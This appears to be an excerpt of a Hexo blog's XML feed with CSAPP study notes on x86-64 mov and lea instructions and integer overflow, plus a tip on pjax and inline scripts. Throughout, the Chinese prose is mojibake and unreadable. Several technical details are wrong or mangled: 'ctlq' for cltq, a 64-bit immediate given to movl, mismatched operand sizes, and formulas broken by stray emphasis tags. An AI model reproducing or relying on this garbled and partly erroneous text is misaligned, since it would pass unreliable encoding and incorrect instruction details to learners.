<li>æ±‡ç¼–æŒ‡ä»¤åçš„ä¸ºæ“ä½œæ•°ï¼Œä¸€éæŒ‡ä»¤éƒ½æœ‰ä¸€ä¸ªæˆ–è€…å¤šä¸ªæ“ä½œæ•°ï¼Œæ“ä½œæ•°çš„å€¼æœ‰ä¸‰ç§æ¥æºï¼Œä¸€ç§æ˜¯ç«‹å³æ•°ï¼Œä¸€ç§æ˜¯æ¥è‡ªå¯„å­˜å™¨ï¼Œä¸€ç§æ˜¯æ¥è‡ªå†…å­˜ã€‚</li>
<li>ç«‹å³æ•°çš„ä¹¦å†™æ˜¯$åç›´æ¥è·Ÿæ­£å¸¸çš„æ•´æ•°ï¼Œå¦‚movb $0x45, %bl æ“ä½œæ•°ç±»å‹ä¸ºç«‹å³æ•°ä¸å¯„å­˜å™¨</li>
<li>å¯„å­˜å™¨ç±»å‹çš„æ“ä½œæ•°åªèƒ½æ˜¯1ã€2ã€4ã€8å­—èŠ‚ï¼Œè¿™æ ·æ˜¯ä¸ºäº†å‘åå…¼å®¹ï¼Œå¦‚8å­—èŠ‚ä¸º64ä½çš„æ“ä½œæ•°å¯¹åº”64ä½å¯»å€èƒ½åŠ›çš„ç³»ç»Ÿï¼Œ4å­—èŠ‚åˆ™å¯¹åº”32ä½ç³»ç»Ÿç­‰ç­‰ã€‚å¦‚ movq %rax,%rdx çš„æ“ä½œæ•°ç±»å‹å‡ä¸ºå¯„å­˜å™¨</li>
<li>å¯¹äºæ“ä½œæ•°ä¸ºå†…å­˜ç±»å‹çš„ï¼Œæœ‰å¤šç§ä¸åŒçš„å¯»å€æ¨¡å¼ï¼š<ul>
<li>ç«‹å³æ•°å¯»å€â€”$0x54 </li>
<li>å¯„å­˜å™¨å¯»å€â€”%rax</li>
<li>ç»å¯¹å¯»å€â€”â€“0x56</li>
<li>é—´æ¥å¯»å€â€”â€“(%rax)</li>
<li>åŸºå€+åç§»é‡å¯»å€â€”8(%rax)</li>
<li>å˜å€å¯»å€â€”(%rax,%rbx)</li>
<li>å˜å€å¯»å€â€”7(%rax,%rbx)</li>
<li>æ¯”ä¾‹å˜å€å¯»å€â€”(,%rax,4)</li>
<li>æ¯”ä¾‹å˜å€å¯»å€â€”7(,%rax,8)</li>
<li>æ¯”ä¾‹å˜å€å¯»å€â€”(%rax,%rbx,1)</li>
<li>æ¯”ä¾‹å˜å€å¯»å€â€”7(%rbx,%rax,2)</li>
<li>æ¯”ä¾‹å€¼åªèƒ½ä¸º1,2ï¼Œ4,8</li>
</ul>
</li>
<li>æ•°æ®ä¼ é€æŒ‡ä»¤ï¼šmovb movw movl movqåˆ†åˆ«å¯¹åº”1ï¼Œ2,4ï¼Œ8å­—èŠ‚çš„ä¼ é€ï¼Œæœ‰ä¸¤ä¸ªæ“ä½œæ•°ï¼Œä¸€ä¸ªæºæ“ä½œæ•°ä¸€ä¸ªç›®çš„åœ°å€ï¼Œå¦‚movq (%rbx),%rax è¡¨ç¤ºä»å¯„å­˜å™¨%rbxä¸­è¯»å–å…¨éƒ¨64ä½å¯¹åº”çš„å†…å­˜åœ°å€çš„å€¼å­˜åˆ°å¯„å­˜å™¨%raxä¸­ï¼Œå†æ¯”å¦‚movl $0x5495868383930205,-56(%rax)ï¼Œè¡¨ç¤ºå°†32ç«‹å³æ•°$0x5495868383930205 å­˜åˆ°å¯„å­˜å™¨%raxä¸­çš„å€¼è¡¨ç¤ºçš„å†…å­˜åœ°å€-56å­—èŠ‚çš„ä½ç½®ä¸Šã€‚</li>
<li>movzbw movzbl movzwl movzbq movzwqï¼Œåœ¨è¾ƒå°çš„æºå€¼å¤åˆ¶åˆ°è¾ƒå¤§çš„ç›®çš„æ—¶è¿ç”¨é›¶æ‰©å±•ä½¿ç”¨è¿™äº›æŒ‡ä»¤ï¼Œæ³¨æ„åˆ°è¿™é‡Œå°‘äº†movzlq,å³åŒå­—æ‰©å±•åˆ°4å­—ï¼Œè¿™æ˜¯å› ä¸ºè¯¥æ–¹æ³•å¯ä»¥é€šè¿‡movlè‡ªåŠ¨å®ç°ï¼Œå› ä¸ºåœ¨å†™å¯„å­˜å™¨çš„æ—¶å€™å‡¡æ˜¯äº§ç”Ÿå¤§äº32ä½çš„å€¼å…¶å¯„å­˜å™¨é«˜å±éƒ½å°†è¢«ç½®äº0ï¼Œæ‰€ä»¥å¯ä»¥ç”¨movlæå¸¦movzlqï¼Œ</li>
<li>movsbw movsbl movswl movsbq movswq movslq ctlq åœ¨è¾ƒå°çš„æºå€¼å¤åˆ¶åˆ°è¾ƒå¤§çš„ç›®çš„æ—¶è¿ç”¨å­—ç¬¦æ‰©å±•ä½¿ç”¨è¿™äº›æŒ‡ä»¤ï¼Œæ³¨æ„åˆ°è¿™é‡Œå¤šäº†ä¸€ä¸ªctlqä¸movslqï¼Œä¸Šé¢è¯´äº†0æ‰©å±•å¡«å……0åˆšå¥½ä¸32ä½ç½®é›¶å»åˆæ‰€ä»¥å¯ä»¥æåˆ°ï¼Œè¿™é‡Œä½¿ç”¨ç¬¦å·æ‰©å±•æ‰©å±•çš„æ˜¯æœ€é«˜ä½ï¼Œå¯èƒ½ä¸º1ï¼Œæ‰€ä»¥movslqä¸èƒ½çœç•¥ã€‚ctlq ä¸“æŒ‡å°†%eaxä¸­çš„å†…å®¹ç§»åŠ¨åˆ°%raxä¸­ï¼Œä¸movslq %eaq,%raxç­‰æ•ˆ</li>
<li>ä¸Šé¢ä¸¤ç»„æŒ‡ä»¤çš„ç›®çš„æ“ä½œæ•°åªèƒ½ä¸ºå¯„å­˜å™¨åœ°å€ï¼Œæºæ“ä½œæ•°å¯ä»¥æ¥è‡ªå¯„å­˜å™¨ï¼Œç«‹å³æ•°ï¼Œå†…å­˜ã€‚</li>
<li>è¿™é‡Œæœ‰ä¸€ä¸ªcè¯­è¨€ç¼–å†™çš„å‡½æ•°ï¼š<br>  long exchange(long *xp, long y)<br>  {<br>      long x &#x3D; *xp;<br>      *xp &#x3D; y<br>      return x<br>  }</li>
</ul>
<p>è°ƒç”¨long 1 &#x3D; 5; exchange(&amp;a,8)ï¼Œæœ€åè¿”å›çš„å€¼ä¸º5ï¼Œè¿™æ˜¯ä¸€ä¸ªæ€æ ·çš„è¿‡ç¨‹å‘¢ï¼Œè¯¥æ®µä»£ç ç»è¿‡ç¼–è¯‘å™¨ç¼–è¯‘åå˜æˆ<br>		exchange:<br>			movq (%rdi),%rax<br>			movq %rsi, (%rdi)<br>			ret<br>è§£é‡Šï¼š%rdi  å­˜å‚¨ xp  %rsi å­˜å‚¨ yï¼Œé¦–å…ˆè°ƒç”¨xpçš„å€¼å¯¹åº”çš„å†…å­˜åœ°å€ä¸­çš„å€¼èµ‹å€¼ç»™xä¹Ÿå°±æ˜¯5ï¼Œç„¶åå°†8èµ‹å€¼ä¸ºxpå¯¹åº”çš„å†…å­˜åœ°å€ï¼Œä¹Ÿå°±æ˜¯aæŒ‡å‘çš„å†…å­˜åœ°å€ã€‚æœ€åè¿”å›%raxçš„å€¼ä¹Ÿå°±æ˜¯x&#x3D;5,ã€‚æ›´æœ‰è¿™ä¸ªæ˜¯æœ‰a&#x3D;8ï¼Œå‘ç”Ÿäº†æ•°æ®äº¤æ¢ã€‚</p>
<ul>
<li><p>ä¸€é“ç»ƒä¹ é¢˜,é€šè¿‡movæŒ‡ä»¤å®Œæˆç±»å‹è½¬æ¢ï¼šæ“ä½œæ•°åœ°å€åˆ†åˆ«å­˜åœ¨%rdi ä¸%rsiä¸­<br>  charâ€“&gt;int:<br>          movsbl (%rdi),%rax<br>          movl %eax,(%rsi)<br>  charâ€“&gt; unsigned int<br>          movsbl (%rdi),%rax<br>          movl %eax,(%rsi)<br>  unsigned char  â€“&gt;  long<br>          movzbl (%rdi),%rax<br>          movq %rax,(%rsi)</p>
</li>
<li><p>å‹æ ˆä¸å¼¹æ ˆï¼šæ ˆæ˜¯å‘ä¸‹å¢é•¿çš„ï¼Œè¾ƒä½çš„æ ˆåœ°å€åœ¨ä¸‹é¢ï¼Œæ‰€ä»¥å‹æ ˆå°±æ˜¯å¯¹æ ˆåœ°å€åšå‡æ³•ï¼Œå¼¹æ ˆå°±æ˜¯åšåŠ æ³•ã€‚æ ˆéµå¾ªçš„æ˜¯åè¿›å…ˆå‡ºçš„åŸåˆ™å³ FILOï¼Œå‹æ ˆä½¿ç”¨æŒ‡ä»¤pushq pushl pushw pushbï¼Œå¼¹æ ˆä½¿ç”¨æŒ‡ä»¤popq popl popw popbã€‚å‹æ ˆçš„æ—¶å€™é¦–å…ˆå°†æ ˆé¡¶ä¸‹ç§»ç„¶åè®²æ•°æ®å­˜å‚¨è¿›å»ï¼Œå¦‚pushb $0x56 ,å¦‚æœæ­¤æ—¶çš„æ ˆé¡¶ä½ç½®æ˜¯0x101ï¼Œé‚£ä¹ˆé¦–å…ˆå°†æ ˆé¡¶å‘ä¸‹ç§»åŠ¨1å­—èŠ‚å¾—åˆ°æ ˆé¡¶ä½ç½®0x100ï¼Œç„¶åè®²1å­—èŠ‚çš„æ•°æ®$0x56æ”¾è¿›å»ï¼Œå®Œæˆå‹æ ˆæ“ä½œã€‚è¿™ä¸ªè¿‡ç¨‹å¯ä»¥æ‹†åˆ†æˆä¸¤æ­¥å³ subn $1,%rsp     movb $0x56,(%rsp)ï¼Œä¸è¿‡è¿™æ ·æ‹†åˆ†å°†å¯¼è‡´æ›´å¤§çš„è¿ç®—é‡æ‰€ä»¥ä¸è¢«é‡‡ç”¨ã€‚å¼¹æ ˆçš„è¿‡ç¨‹ä¸€æ ·ï¼Œç›´æ¥å°†æ ˆé¡¶ä½ç½®ä¸Šç§»å³å¯ã€‚å³popb %rax ç›¸å½“äº movb (%rsp), %rax addb $1,%rsp</p>
</li>
<li><p>åŠ è½½æœ‰æ•ˆåœ°å€ï¼šleaq leal leaw leabæŒ‡ä»¤ åªåŠ è½½åœ°å€ä¸åŠ è½½å€¼<br>  å¦‚leaq (%rdi,%rsi,4) %rax è¡¨ç¤ºè®²%rdi+4*%rsiè®¡ç®—å‡ºçš„å†…å­˜åœ°å€èµ‹å€¼ç»™å¯„å­˜å™¨%raxï¼Œè€Œä¸æ˜¯è·å–å†…å­˜åœ°å€å¯¹åº”çš„å€¼ã€‚<br>  å…¶å’Œmovq  (%rdi,%rsi,4) %rax çš„ç»“æœæ˜æ˜¾ä¸åŒï¼Œä½¿ç”¨movæˆ–è·å–åˆ°å†…å­˜åœ°å€ä¸­çš„å€¼èµ‹å€¼è€Œå¯„å­˜å™¨%raxã€‚<br>  åˆ©ç”¨è¿™ä¸ªç‰¹æ€§å¯ä»¥ç”¨æ¥è¿›è¡Œç®€ç­”çš„åŠ æ³•ä¸ä¹˜æ³•è¿ç®—ï¼Œå¦‚æœ‰è¿™æ ·ä¸€ä¸ªCå‡½æ•°<br>  long scale(long x, long y, longz){<br>  long t &#x3D; x+4<em>y+12</em>z;<br>  return t<br>  }<br>  ç¼–è¯‘å™¨ç¼–è¯‘åå°†å˜æˆï¼š<br>  scale:<br>  leaq (%rdi, %rsi, 4), %rax   # x+4y<br>  leaq (%rdx, %rdx, 2), %rdx  # z+2z &#x3D; 3z<br>  leaq (%rax, %rdx, 4), %rax  # x+4y+4*(3z)&#x3D;x+4y*12z<br>  ret</p>
</li>
</ul>
<p>ç®€ç›´ä¸è¦å¤ªç¥å¥‡ã€‚ã€‚ã€‚</p>
]]></content>
      <categories>
        <category>è¯»ä¹¦ç¬”è®°</category>
      </categories>
      <tags>
        <tag>æ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿ</tag>
      </tags>
  </entry>
  <entry>
    <title>è§£å†³hexoå†…åµŒjsæ— æ³•åŠ è½½é—®é¢˜</title>
    <url>/archives/7f771bb5.html</url>
    <content><![CDATA[<p>æ£€æŸ¥ç½‘ç«™æ˜¯å¦å¼€å¯äº†<code>pjax</code><br>æŸ¥çœ‹ä¸»é¢˜é…ç½®æ–‡ä»¶ï¼Œæœç´¢å…³é”®å­—<code>pjax</code><br>å¦‚æœ<code>pjax</code>çš„å€¼ä¸ºtrueï¼Œåˆ™è¯æ˜å¼€å¯äº†ï¼Œæ­¤æ—¶è‹¥è¦ä½¿å¾—å†…åµŒ<code>js</code>åœ¨æ¯æ¬¡è®¿é—®æ—¶éƒ½èƒ½å¤Ÿæ‰§è¡Œåœ¨<code>js</code>æ ‡ç­¾ä¸Šæ·»åŠ <code>data-pjax</code> å±æ€§å³å¯  </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script data-pjax type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">xxxx</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>bugä¿®å¤</category>
        <category>tips</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>pjax</tag>
      </tags>
  </entry>
  <entry>
    <title>æ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿè¯»ä¹¦ç¬”è®°ï¼ˆä¸‰ï¼‰</title>
    <url>/archives/f9db7072.html</url>
    <content><![CDATA[<ul>
<li>æ— ç¬¦å·æ•°çš„åŠ æ³•ï¼šå½“ä¸¤ä¸ªæ— ç¬¦å·æ•°ç›¸åŠ çš„æ—¶å€™å¯èƒ½å‘ç”Ÿæº¢å‡ºï¼Œå¦‚æœ0&lt;&#x3D;x,y&lt;2**w  wä¸ºå­—é•¿ï¼Œé‚£ä¹ˆ0&lt;&#x3D;x*y &lt;&#x3D; 2**w-2ï¼Œè¿™æ ·ç»“æœçš„å­—é•¿å°±å¯èƒ½è†¨èƒ€åˆ°w+1ä½ï¼Œå½“ç„¶å¦‚æœ0&lt;&#x3D;x*y&lt;&#x3D;2**w-1çš„æ—¶å€™æ˜¯ä¸ä¼šå‘ç”Ÿå­—é•¿è†¨èƒ€çš„ï¼Œåªæœ‰å½“2**w&lt;&#x3D;x*y&lt;&#x3D;2**-2æ—¶æ‰ä¼šå‘ç”Ÿå­—é•¿è†¨èƒ€ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ª4ä½çš„æ•°å¯èƒ½è†¨èƒ€åˆ°5ä½ï¼Œæ­¤æ—¶å°±å‘ç”Ÿäº†æ•´æ•°æº¢å‡ºã€‚æº¢å‡ºçš„å€¼å‘ç”Ÿæœ€é«˜ä½æˆªæ–­ï¼Œæ¯”å¦‚9+12 &#x3D; 21ï¼Œå¤§äºäº†4ä½æ— ç¬¦å·æ•´æ•°çš„æœ€å¤§å€¼15ï¼Œå…¶ç»“æœè‚¯å®šä¼šå‘ç”Ÿæº¢å‡ºï¼Œæˆ‘ä»¬çŸ¥é“21çš„5ä½äºŒè¿›åˆ¶ä¾¿æ˜¯ä¸º10101ï¼Œæœ€é«˜ä½ä¸¢å¼ƒåçš„ç»“æœä¸º0101ï¼Œè½¬æ¢ä¸ºåè¿›åˆ¶å°±æ˜¯5ï¼Œæ³¨æ„åˆ°5&#x3D;21-2**4ï¼Œé‚£ä¹ˆæ˜¯å¦å…·æœ‰æ™®é€‚è§„å¾‹ï¼Ÿæˆ‘ä»¬çŸ¥é“4ä½å¦‚æœè†¨èƒ€åˆ°5ä½é‚£ä¹ˆå°±æ˜¯å‘ç”Ÿäº†è¿›ä½ï¼Œå¢åŠ äº†æƒé‡1*2**4 &#x3D; 16ï¼Œç›¸åº”çš„æˆªæ–­åå°±æ˜¯å‡å»16ï¼Œçœ‹æ¥è¯¥è§„å¾‹æ˜¯å…·æœ‰æ™®é€‚æ€§çš„ã€‚</li>
<li>æ— ç¬¦å·æ•°åŠ æ³•æº¢å‡ºçš„æ£€æµ‹ï¼šå¦‚æœs&#x3D;x+yï¼Œs&lt;xæˆ–è€…x&lt;yé‚£ä¹ˆåˆ™å‘ç”Ÿäº†æº¢å‡ºï¼ŒåŸç†ä¸ºå½“så‘ç”Ÿæº¢å‡ºåæœ‰ç­‰å¼s&#x3D;x+y-2**w wä¸ºå­—é•¿ï¼Œæˆ‘ä»¬çŸ¥é“yè‚¯å®šæ˜¯å°äºä¸º2**wçš„é‚£ä¹ˆy-2**wåˆ™å¿…å®šä¸ºè´Ÿæ•°ï¼Œé‚£ä¹ˆs&#x3D;x+ï¼ˆè´Ÿæ•°ï¼‰ï¼Œç»“æœsè‚¯å®šå°äºxï¼ŒåŒç†å¯æ¨å¯¼å¤„s&lt;yï¼Œå› æ­¤è¯¥æ–¹å¼å¯ä»¥ä½œä¸ºæ£€æµ‹çš„ä¾æ®ã€‚</li>
<li>è¡¥ç åŠ æ³•ï¼šåŒç†è¡¥ç åŠ æ³•åŒæ ·å¯èƒ½å‘ç”Ÿæº¢å‡ºï¼Œä¸è¿‡å…¶æº¢å‡ºå¯èƒ½æœ‰ä¸¤ä¸ªæ–¹å‘ï¼Œå³æ­£æº¢å‡ºä¸è´Ÿæº¢å‡ºã€‚å½“-(2**(w-1)) &lt;&#x3D;x,y&lt;&#x3D;2**(w-1)-2æ—¶ï¼Œå¯èƒ½å‘ç”Ÿæº¢å‡ºï¼Œå½“x+y&gt; &#x3D;2**(w-1)æ—¶å‘ç”Ÿæ­£æº¢å‡ºï¼Œå½“x+y&lt;-2**(w-1)æ—¶å‘ç”Ÿè´Ÿæº¢å‡ºï¼Œå–ä¸­é—´æ—¶æ­£å¸¸ä¸ä¼šå‘ç”Ÿæº¢å‡ºï¼ŒåŒæ ·çš„é“ç†å½“å‘ç”Ÿæº¢å‡ºæ˜¯æ—¶äº§ç”Ÿäº†è¿›ä½ã€‚é‚£ä¹ˆå½“ç»“æœæ˜¯æ­£æº¢å‡ºæ—¶åˆ™æŠŠæœ€é«˜ä½çš„æ­£æƒä¸¢å¤±äº†ï¼Œäºæ˜¯ç»“æœä¸ºx+y-2**wï¼Œå½“å‘ç”Ÿè´Ÿæº¢å‡ºçš„æ—¶å€™ï¼Œç›¸å½“äºå‡å»äº†è´Ÿæƒï¼Œä¹Ÿå°±æ˜¯åŠ ä¸Šæ­£æƒï¼Œäºæ˜¯ç»“æœä¸ºx+y+2**w</li>
<li>éƒ¨é—¨åŠ æ³•æº¢å‡ºçš„åˆ¤æ–­ï¼šå½“ä¸¤æ­£æ•°ç›¸åŠ å¾—åˆ°è´Ÿæ•°çš„æ—¶å€™ã€ä¸¤è´Ÿæ•°ç›¸åŠ å¾—åˆ°æ­£æ•°çš„æ—¶å€™å‘ç”Ÿæº¢å‡ºã€‚</li>
<li>åŠ æ³•é€†å…ƒï¼šæ— ç¬¦å·æ•°çš„åŠ æ³•é€†å…ƒï¼Œå³æ±‚éï¼Œå¯¹äºä»»æ„ä¸€ä¸ªwä½çš„æ— ç¬¦å·æ•´æ•°xï¼Œæ€»æœ‰ä¸€ä¸ªæ•°-xæ»¡è¶³-x+x &#x3D; 0ã€‚æ¯«æ— ç–‘é—®çš„å½“xä¸º0çš„æ—¶å€™å…¶åŠ æ³•é€†å…ƒåˆ™ä¸º0ï¼Œå½“x&gt;0æ—¶å…¶åŠ æ³•é€†å…ƒä¸º2**w-xï¼Œå½“ç„¶å¯¹äºæ— ç¬¦å·æ•°æ¥è¯´æ˜¯æ²¡æœ‰è´Ÿæ•°çš„é‚£ä¹ˆæ€æ ·æ‰èƒ½å¾—å‡ºè¿™ä¸ªç»“è®ºå‘¢ï¼Œæˆ‘ä»¬ä½¿ç”¨2**-x+x &#x3D; 2<em><em>wï¼Œè¯¥æ•°å¤§äºäº†wä½æ— ç¬¦å·æ•°çš„æœ€å¤§å€¼å°†ä¼šå‘ç”Ÿæº¢å‡ºï¼Œå…¶ç»“æœä¸º2</em>*w-2</em>*w &#x3D; 0ï¼Œåˆšå¥½æ»¡è¶³åŠ æ³•é€†å…ƒçš„å®šä¹‰ã€‚å¯¹äºæœ‰ç¬¦å·æ•°æ±‚éï¼Œå½“xä¸æ˜¯æœ‰ç¬¦å·æ•°çš„æœ€å°å€¼çš„æ—¶å€™ï¼Œå¾ˆæ˜æ˜¾å…¶ç»“æœå°±ä¸º-xï¼Œå½“xä¸ºæœ€å°å€¼çš„æ—¶å€™æ²¡æœ‰ä¸€ä¸ª-xä¸å…¶å¯¹åº”åˆ™ä¸èƒ½ç®€å•çš„è¿™æ ·è¿ç®—ï¼Œä¸è¿‡å½“ä¸¤ä¸ªæœ€å°å€¼ç›¸åŠ æ—¶æœ‰x+x &#x3D; -2**(w-1)+(-2**(w-1)) &#x3D; -2**wæ­¤æ—¶è®²å‘ç”Ÿè´Ÿæº¢å‡ºï¼Œæ ¹æ®å‰é¢çš„æ”»åŠ¿æ­¤æ—¶x+x&#x3D;-2**w+2**w&#x3D;0ï¼Œä¹Ÿå°±æ˜¯è¯´æ— ç¬¦å·æ•°æœ€å°å€¼çš„åŠ æ³•é€†å…ƒä¸ºå…¶æœ¬èº«ã€‚</li>
<li>ä¸€ä¸ªè¡¥ç è¡¨ç¤ºçš„æ•°å¦‚ä½•å–éï¼Œæœ‰ä¸¤ç§æ–¹å¼ï¼Œç¬¬ä¸€ç§ï¼Œå¯¹è¯¥æ•°çš„ä½çº§è¡¨ç¤ºæ¯ä¸€ä½å–è¡¥ï¼Œç„¶åè®²ç»“æœ+1ï¼Œå¦‚4ä½è¡¥ç -6çš„ä½çº§è¡¨ç¤ºä¸º1010ï¼Œæ¯ä¸€ä½å–è¡¥ä¸º0101ï¼Œè½¬ä¸ºæ•´æ•°ä¸º5ï¼Œç„¶ååŠ 1ä½6ï¼Œä¸ºè¡¥ç -6çš„éã€‚å¦‚æœæ˜¯-8å‘¢ï¼ŸåŒæ ·çš„ä½çº§è¡¨ç¤ºä¸º1000ï¼Œå–å0111ä½7åŠ 1ä¸º8ï¼Œé—®é¢˜æ¥äº†æˆ‘ä»¬çŸ¥é“4ä½è¡¥ç çš„æœ€å°å€¼ä¸º-8ï¼Œå…¶éåº”è¯¥ä¸ºå…¶æœ¬èº«å³-8æ‰å¯¹ï¼Œè¿™é‡Œç®—å‡ºæ¥ç¡®å®8ï¼Œæ€ä¹ˆå›äº‹ï¼Ÿï¼Ÿæˆ‘ä¹Ÿä¸çŸ¥é“å‘¢ã€‚ã€‚ã€‚ã€‚ç¬¬äºŒç§æ–¹å¼å¯¹äºä¸€ä¸ªé0çš„è¡¥ç æ•°æ¥è¯´ï¼Œæ€»èƒ½æ‰¾åˆ°å…¶æœ€å³è¾¹çš„1ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€å¯¹è¿™ä¸ªå¯¹å·¦è¾¹çš„æ•°å–åå°±å¯ä»¥äº†ï¼Œè¿˜æ˜¯å¯¹äºæ•´æ•°-6æ¥è¯´1010ï¼Œè¿ç®—åå°±æ˜¯0110ï¼Œè½¬ä¸ºåè¿›åˆ¶æ•´æ•°ä¸º6ï¼Œå³-6çš„éä¸º6ï¼Œé‚£ä¹ˆå¯¹äº-8æ¥è¯´å‘¢ï¼Œ1000è¿ç®—åå˜æˆäº†1000ï¼Œè¿˜æ˜¯-8ï¼Œè¿™ä¸ªå°±æ­£å¸¸äº†ã€‚ã€‚</li>
<li>æ— ç¬¦å·æ•°çš„ä¹˜æ³•ï¼šåŒæ ·çš„å¯¹äº0&lt;&#x3D;x,y&lt;&#x3D;2**(w-1)æ¥è¯´ï¼Œx<em>yäº§ç”Ÿçš„ç»“æœå¯èƒ½å‘ç”Ÿæº¢å‡ºï¼Œå…¶ç»“æœèŒƒå›´ä¸º0&lt;s&lt;&#x3D;2</em>*(2<em>w)-2</em><em>(w+1)+1ï¼Œè¿™å¯èƒ½éœ€è¦2</em>wä½æ¥è¡¨ç¤ºsï¼ŒåŒæ ·çš„è®¡ç®—ç»“æœå°†å‘ç”Ÿé«˜ä½æˆªæ–­ï¼Œé«˜wä½è¢«ä¸¢å¼ƒåªç•™ä¸‹ä½wä½ï¼Œé‚£ä¹ˆè¿ç®—çš„ç»“æœåˆ™ä¸ºx<em>y &#x3D; (x.y)mod 2</em>*wï¼Œæ€ä¹ˆæ¨å¯¼çš„å‘¢ï¼Ÿä¹¦ä¸Šæ²¡å†™å“¦ï¼Œä¸è¿‡æˆ‘æƒ³ä¹Ÿä¸éš¾çš„ï¼Œé«˜ä½æˆªæ–­å°±æ˜¯ å‡å»(2**w+â€¦+2**(2w-1))è¿™ä¸ªå€¼æ¨¡2**wä¸º(0+2**1+â€¦.+2**w-1)ï¼Œè¿™ä¸ªç»“æœçœ‹ç€æ˜¯ä¸æ˜¯å¾ˆçœ¼ç†Ÿï¼Œè¿™ä¸å°±æ˜¯wä½æ•´æ•°çš„è¡¨ç¤ºæ–¹æ³•å—ï¼Ÿè¿™é‡Œè§‚å¯Ÿåˆ°ä¸€ä¸ªè§„å¾‹ï¼Œä¸€ä¸ªwä½çš„æ•°å‘ç”Ÿäº†å­—é•¿è†¨èƒ€è®¡ç®—ç®—æœ¯ç»“æœä¸ºsï¼Œé‚£ä¹ˆæˆªæ–­åçš„å€¼ä¸ºs mod 2**wï¼Œè¿™æ˜¯å› ä¸ºè†¨èƒ€çš„ä½çš„æƒé‡mod 2**wç»“æœéƒ½ä¸º0,æœ‰å› ä¸ºä½çš„æœ€å¤§å€¼ä¹Ÿä¸å¯èƒ½å¤§äº2**wï¼Œé‚£ä¹ˆè¿™éƒ¨åˆ†å°†ä½œä¸ºä½™æ•°è¢«ä¿ç•™ï¼Œé«˜ä½åˆ™å…¨éƒ¨è¢«æ•´é™¤äº†ã€‚</li>
<li>æœ‰ç¬¦å·æ•°çš„ä¹˜æ³•ï¼Œä¸æ— ç¬¦å·æ•°çš„ä¹˜æ³•è§„åˆ™æ˜¯ä¸€æ ·çš„ï¼Œæ¨å¯¼è¿‡ç¨‹ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚</li>
<li>è¡¥ç ä¹˜æ³•ä¸æœ‰ç¬¦å·ä¹˜æ³•çš„ä½çº§ç­‰ä»·æ€§è¯æ˜ï¼šå¤ªä»–å¦ˆå¤æ‚äº†ï¼Œé¦–å…ˆæˆ‘ä»¬æœ‰ä¸¤ä¸ªä½çº§å‘é‡aä¸bï¼Œé‚£ä¹ˆå…¶æ— ç¬¦å·æ•°è¡¨ç¤ºæœªx &#x3D; B2U(a)ä¸y &#x3D; B2U(b)ï¼Œè¡¥ç è¡¨ç¤ºä¸ºw &#x3D; B2T(a)ä¸z &#x3D; B2T(b)é‚£ä¹ˆå°±æœ‰T2B(a<em>b) &#x3D; U2B(a</em>b)æˆç«‹ã€‚åœ¨è¿›è¡Œæ— ç¬¦å·æ•°ä¸è¡¥ç è½¬æ¢æ—¶æˆ‘ä»¬æœ‰å…¬å¼x&#x3D;w+2**k	 ï¼Œç°åœ¨æœ‰(x<em>y) mod 2**k &#x3D; ((w+2</em>*k)(z+2**k)) mod 2**k &#x3D; (w<em>z+(w+z)2</em>*k+2**(2<em>k)) mod 2</em>*k &#x3D; (w<em>z) mod 2</em>*kï¼Œå³(x<em>y) mod 2</em>*k &#x3D;(w<em>z) mod 2</em>*kï¼Œæ ¹æ®è¡¥ç ä¹˜æ³•åŸåˆ™æœ‰w.z &#x3D; U2T(w<em>z mod 2</em>*k) ä¸¤è¾¹åŒæ—¶åº”ç”¨å‡½æ•°T2UåŒ–ç®€åå¾—åˆ°T2U(w.z) &#x3D; w<em>z mod 2</em>*k é‚£ä¹ˆä¸Šå¼è½¬æ¢ä¸ºT2U(w.z) &#x3D; (w<em>z) mod 2</em>*k &#x3D; (x<em>y) mod 2</em>*k &#x3D; x.yï¼Œä¸¤è¾¹åŒæ—¶åº”ç”¨U2Bä¸º U2B(T2U(w.z)) &#x3D; U2B(x.y)å°±æ˜¯T2B(w.z)&#x3D;U2B(x.y)ï¼Œåˆ°æ­¤è¯æ˜å®Œæ¯•ï¼Œæ— ç¬¦å·æ•°ä¸è¡¥ç ä¹˜æ³•æœ‰ä½çº§ç­‰ä»·æ€§è´¨ã€‚ä¸¾ä¸ªä¾‹å­å¯¹äº3ä½æ— ç¬¦å·æ•°5[101]å…¶è¡¥ç è¡¨ç¤ºä¸º-3 [101]ï¼Œæ— ç¬¦å·æ•°3[011] å…¶è¡¥ç è¡¨ç¤ºä¸º3[011]ï¼Œä¸¤ä¸ªæ— ç¬¦å·æ•°ç›¸ä¹˜3<em>5 &#x3D; 15äº§ç”Ÿäº†æº¢å‡ºï¼ŒæŒ‰ç…§å…¬å¼é™¤ä»¥8å–æ¨¡ä¸º7[111]ï¼Œä¸¤ä¸ªè¡¥ç ç›¸ä¹˜-3</em>3&#x3D;-9äº§ç”Ÿäº†æº¢å‡ºï¼ŒæŒ‰ç…§æˆªæ–­åŸåˆ™é™¤ä»¥8å–æ¨¡ä½™-1[111]ï¼Œå¯ä»¥çœ‹åˆ°ä¸¤ä¸ªç»“æœè™½ç„¶åè¿›åˆ¶è¡¨ç¤ºç»“æœä¸åŒä½†æ‹¥æœ‰ç›¸åŒçš„ä½çº§è¡¨ç¤ºã€‚</li>
<li>x å‘å·¦ç§»åŠ¨kä½çš„æ¨å¯¼è¿‡ç¨‹ï¼Œå½“ç„¶kä¸èƒ½å¤§äºç­‰äºwã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/10f375e86f624938362e3be5689c52d7.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li>
